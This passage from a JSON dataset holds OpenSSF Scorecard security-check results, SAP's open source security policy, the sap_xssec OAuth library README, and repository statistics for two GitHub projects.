                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "0 commit(s) and 2 issue activity found in the last 90 days -- score normalized to 1",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/SAP/cloud-pysec/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/SAP/cloud-pysec/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/SAP/cloud-pysec/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/SAP/cloud-pysec/main.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:29",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:31",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:50",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:51",
                        "Info:   0 out of   4 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 27 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/SAP/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/SAP/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/SAP/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/SAP/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/main.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/SAP/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "<!-- START SAP SECURITY.MD V0.0.1 BLOCK -->\n<!-- Please do not remove the version header, this is needed for automatic updates of the SECURITY.md -->\n# SAP Open Source Security Policy\n\nSAP takes the security of our software products and services seriously, which includes all source code repositories managed through our GitHub organizations, including our primary [SAP](https://github.com/SAP), [SAP-docs](https://github.com/SAP-docs) organizations as well as [our other GitHub organizations and projects](https://opensource.sap.com).\n\nIf you believe you have found a security vulnerability in any SAP-owned repository, please report it to us as described below.\n\n## Reporting Security Issues\n\n**Please do not report security vulnerabilities through public GitHub issues.**\n\nInstead, please report them via the SAP Trust Center at [https://www.sap.com/about/trust-center/security/incident-management.html](https://www.sap.com/about/trust-center/security/incident-management.html).\n\nIf you prefer to submit via email, please send an email to [secure@sap.com](mailto:secure@sap.com). If possible, encrypt your message with our PGP key; please download it from the [SAP Trust Center](https://www.sap.com/keyblock).\n\nPlease include the requested information listed below (as much as you can provide) to help us better understand the nature and scope of the possible issue:\n\n  - The repository name or URL\n  - Type of issue (buffer overflow, SQL injection, cross-site scripting, etc.)\n  - Full paths of the source file(s) related to the manifestation of the issue\n  - The location of the affected source code (tag/branch/commit or direct URL)\n  - Any particular configuration required to reproduce the issue\n  - Step-by-step instructions to reproduce the issue\n  - Proof-of-concept or exploit code (if possible)\n  - Impact of the issue, including how an attacker might exploit the issue\n\nThis information will help us triage your report more quickly.\n\n## Preferred Languages\n\nWe prefer all communications to be in English.\n\n## Disclosure Guidelines\n\nWe like to ask you to follow the [Disclosure Guidelines for SAP Security Advisories](https://www.sap.com/documents/2022/02/9ccd9ca0-167e-0010-bca6-c68f7e60039b.html).\n\n## SAP Internal Response Process\n\nAs an SAP employee, please check our internal open source security response process ([go/oss-security-response](https://go.sap.corp/oss-security-response)) for further details on how to handle security incidents.\n\n<!-- END SAP SECURITY.MD V0.0.1 BLOCK -->\n",
        "project_all_labels": [
            "bug",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "question",
            "wontfix",
            "working in progress"
        ],
        "README_content": "[![REUSE status](https://api.reuse.software/badge/github.com/SAP/cloud-pysec)](https://api.reuse.software/info/github.com/SAP/cloud-pysec)\n\n# Description\nThis project is a python client library called *sap_xssec* for validation of *OAuth access tokens* issued by the *XSUAA*. \n\n### OAuth Authorization Code Flow\nThe typical web application use the OAuth authorization code flow for authentication, which is described as follows:\n1. A user accesses the web application using a browser.\n2. The web application (in typical SAP Cloud Platform applications, this is an application router) acts as OAuth client and redirects\nto the OAuth server for authorization.\n3. Upon authentication, the web application uses the code issued by the authorization server to request an access token.\n4. The web application uses the access token to request data from the OAuth resource server.\nThe OAuth resource server validates the token using online or offline validation.\nFor this validation libraries like sap_xssec are used.\n\n\n![alt text](https://raw.githubusercontent.com/SAP/cloud-security-xsuaa-integration/1.4.0/images/oauth.png \"OAuth authorization code flow\")\n\n\n### Usage\n\nFor the usage of this library it is necessary to pass a JWT access token that should be validated to the library.\nThe examples below rely on users and credentials that you should substitute with the ones in your context.\n\nThe typical use case for calling this API lies from within a container when an HTTP request is received and it must \nbe checked if the requester is authorized to execute this method.\nIn this case, the access token is contained in the authorization header (with keyword `bearer`).\nYou can remove the prefix `bearer` and pass the remaining string (just as in the following example as `access_token`) to the API.\n\n```python\nfrom sap import xssec\nfrom cfenv import AppEnv\n\nenv = AppEnv()\nuaa_service = env.get_service(name='<uaa_service_name>').credentials\n\nsecurity_context = xssec.create_security_context(access_token, uaa_service)\n```\n\n**Note:** That the example above uses module [`cfenv`](https://pypi.python.org/pypi/cfenv) to retrieve the configuration of the uaa\nservice instance.\n`uaa_service` is a dict that contains the necessary client information and looks like:\n```\n{\n    'clientid' : 'example_clientid'               // the id of the client\n    'clientsecret': 'example_clientsecret'        // the secret of the client\n    'url': 'example_url'                          // the url of the uaa\n    'uaadomain': 'example_uaadomain'              // the domain of the uaa\n    'verificationkey': 'example_verification key' // (optional) the key used for the verfication of the token\n}\n\n```\nIf the `uaadomain` is set in the `uaa_service` and the `jku` and `kid` are set in the incomming token, the key is requested from the uaa. As a fallback, the `verificationkey` configured in `uaa_service` is used for offline validation. Requested keys are cached for 15 minutes to avoid extensive load on the uaa.\n\nThe creation function `xssec.create_security_context` is to be used for an end-user token (e.g. for grant_type `password`\n or grant_type `authorization_code`) where user information is expected to be available within the token and thus within the security context.\n\n`create_security_context` also accepts a token of grant_type `client_credentials`.\nThis leads to the creation of a limited *SecurityContext* where certain functions are not available.\nFor more details please consult the API description in the wiki.\n\nFor example, the `security_context` object can then be used to check if a user has a required scope:\n\n``` \nsecurity_context.check_scope('uaa.user')\n```\n\nor to receive the client id of a user:\n\n``` \nsecurity_context.get_clientid()\n```\n\nMore details on the API can be found in the [wiki](https://github.com/SAP/cloud-pysec/wiki).\n### Offline Validation\n\nsap_xssec offers offline validation of the access token, which requires no additional call to the UAA.\nThe trust for this offline validation is created by binding the XS UAA service instance to your application.\nInside the credentials section in the environment variable `VCAP_SERVICES`, the key for validation of tokens is included.\nBy default, the offline validation check will only accept tokens intended for the same OAuth2 client in the same UAA identity zone.\nThis makes sense and will cover the vast majority of use cases.\n\n⚠️From version 2.1.0, the `SAP_JWT_TRUST_ACL` environment variable is no longer supported.\n\nIf you want to enable another (foreign) application to use some of your application's scopes, you can add a ```granted-apps``` marker to your scope in the ```xs-security.json``` file (as in the following example). The value of the marker is a list of applications that is allowed to request a token with the denoted scope.\n\n```JSON\n{\n  \"xsappname\"     : \"sample-leave-request-app\",\n  \"description\"   : \"This sample application demos leave requests\",\n  \"scopes\"        : [ { \"name\"                : \"$XSAPPNAME.createLR\",\n                        \"description\"         : \"create leave requests\" },\n                      { \"name\"                : \"$XSAPPNAME.approveLR\",\n                        \"description\"         : \"approve leave requests\",\n                        \"granted-apps\"        : [\"MobileApprovals\"] }\n                    ],\n  \"attributes\"    : [ { \"name\"                : \"costcenter\",\n                        \"description\"         : \"costcenter\",\n                        \"valueType\"           : \"string\"\n                    } ],\n  \"role-templates\": [ { \"name\"                : \"employee\",\n                        \"description\"         : \"Role for creating leave requests\",\n                        \"scope-references\"    : [ \"$XSAPPNAME.createLR\",\"JobScheduler.scheduleJobs\" ],\n                        \"attribute-references\": [ \"costcenter\"] },\n                      { \"name\"                : \"manager\",\n                        \"description\"         : \"Role for creating and approving leave requests\",\n                        \"scope-references\"    : [ \"$XSAPPNAME.createLR\",\"$XSAPPNAME.approveLR\",\"JobScheduler.scheduleJobs\" ],\n                        \"attribute-references\": [ \"costcenter\" ] }\n                    ]\n}\n```\n\n# Configuration\n~~To configure whether the *sap-jwt* or the *py-jwt* library should be used for validation of the jwt token, \nchange the `USE_SAP_PY_JWT` environment variable to `true`.~~\n\n⚠️From version 4.0.0, the `USE_SAP_PY_JWT` environment variable is no longer supported and therefore *py-jwt* is installed by default.\n\n# Requirements\n*sap_xssec* requires *python 3.7* or newer.\n\n\n# Download and Installation\nAs this package is deployed to PyPI, you can simply add `sap_xssec` as a dependency to your python project or \ninstall this package by running `pip install sap_xssec`.\n\n# Known Issues\n# How to obtain support\nOpen an issue in GitHub.\n",
        "num_commits": 197,
        "project_age_days": 1993,
        "project_created_at": "2019-05-16",
        "latest_updated_at": "2024-02-13",
        "latest_pushed_at": "2024-09-10",
        "num_contributors": 12,
        "num_pull": 52,
        "num_issues": 67,
        "num_opening_issue": 2,
        "project_size(kB)": 238,
        "num_stargazers": 10,
        "num_watchers": 10,
        "num_forks": 9,
        "num_subscribers": 8,
        "SecurityPolicy_created_at": "2021-04-15 12:32:11",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "d4655dedec1f9ee1dd7d2e48e1c16124692846b8",
                "url": "https://github.com/SAP/.github/commit/d4655dedec1f9ee1dd7d2e48e1c16124692846b8",
                "date": "2023-11-28 12:35:07"
            },
            {
                "commit_id": "90d02bf23d9856e5d0d6eece24b7e369350a1756",
                "url": "https://github.com/SAP/.github/commit/90d02bf23d9856e5d0d6eece24b7e369350a1756",
                "date": "2023-05-26 15:11:41"
            },
            {
                "commit_id": "95a1a7eb79f0b3583d224eb4041a9e41c275db00",
                "url": "https://github.com/SAP/.github/commit/95a1a7eb79f0b3583d224eb4041a9e41c275db00",
                "date": "2022-08-17 14:11:55"
            },
            {
                "commit_id": "951373c59d661312af571ea1dfc97d36aa5f41f4",
                "url": "https://github.com/SAP/.github/commit/951373c59d661312af571ea1dfc97d36aa5f41f4",
                "date": "2021-04-28 08:44:22"
            },
            {
                "commit_id": "cc58574b17a347cf946f62546009cf978f8aca64",
                "url": "https://github.com/SAP/.github/commit/cc58574b17a347cf946f62546009cf978f8aca64",
                "date": "2021-04-15 12:32:11"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism",
            "Additional information",
            "User guideline",
            "Projects practice"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "hyperledger/aries-cloudagent-python",
        "project_url": "https://github.com/hyperledger/aries-cloudagent-python",
        "SSF": {
            "date": "2024-10-29T21:25:20+07:00",
            "repo": {
                "name": "github.com/hyperledger/aries-cloudagent-python",
                "commit": "6d6c75a7d5a92426dbd854fa17def70c76c23c6f"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch '0.12.lts'",
                        "Warn: branch protection not enabled for branch '0.11.lts'",
                        "Warn: branch protection not enabled for branch '0.10.x'",
                        "Warn: branch protection not enabled for branch 'v0.10.3'",
                        "Warn: branch protection not enabled for branch 'v0.10.2'",
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Warn: 'force pushes' enabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is required - but no codeowners file found in repo",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "17 out of 17 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: Indicio-tech contributor org/company found, didx-xyz contributor org/company found, neoteric technologies contributor org/company found, sktston contributor org/company found, OdysseyMomentum contributor org/company found, dutch-trust-network contributor org/company found, senior solutions architect @quartech contributor org/company found, petri dish development contributor org/company found, sk telecom contributor org/company found, indicio-tech contributor org/company found, anon solutions contributor org/company found, pebble-dev contributor org/company found, portage cybertech contributor org/company found, shopify contributor org/company found, openid contributor org/company found, ula-aca contributor org/company found, animo contributor org/company found, hyperledger contributor org/company found, BCDevOps contributor org/company found, PSPC-SPAC-buyandsell contributor org/company found, ntt data services contributor org/company found, sicpa-dlab contributor org/company found, DTLab-LabCN contributor org/company found, opsecid contributor org/company found, Quartech contributor org/company found, kynetx contributor org/company found, cloudcompass contributor org/company found, becker-carroll contributor org/company found, odysseyhack contributor org/company found, 1CRM contributor org/company found, nyit-vancouver contributor org/company found, full stack developer contributor org/company found, overstockmedici contributor org/company found, decentralized-identity contributor org/company found, bcgov contributor org/company found, sovrin-foundation contributor org/company found, bcgov-c contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 37 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish.yml:41"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/bdd-integration-tests.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/bdd-integration-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/bdd-integration-tests.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/bdd-integration-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/bdd-interop-tests.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/bdd-interop-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/bdd-interop-tests.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/bdd-interop-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/bdd-interop-tests.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/bdd-interop-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/format.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/format.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/format.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/format.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/format.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/format.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nigthly.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/nigthly.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nigthly.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/nigthly.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pip-audit.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pip-audit.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pip-audit.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pip-audit.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pr-tests.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pr-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docs.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish-docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docs.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish-docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docs.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish-docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:64: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:83: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:108: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pythonpublish.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pythonpublish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pythonpublish.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pythonpublish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pythonpublish.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/pythonpublish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/scenario-integration-tests.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scenario-integration-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/scenario-integration-tests.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scenario-integration-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/scenario-integration-tests.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scenario-integration-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/scorecard.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scorecard.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/scorecard.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scorecard.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/scorecard.yml:65: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scorecard.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/scorecard.yml:74: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/scorecard.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/snyk-lts.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk-lts.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/snyk-lts.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk-lts.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/snyk-lts.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk-lts.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/snyk.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/snyk.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/snyk.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/snyk.yml/main?enable=pin",
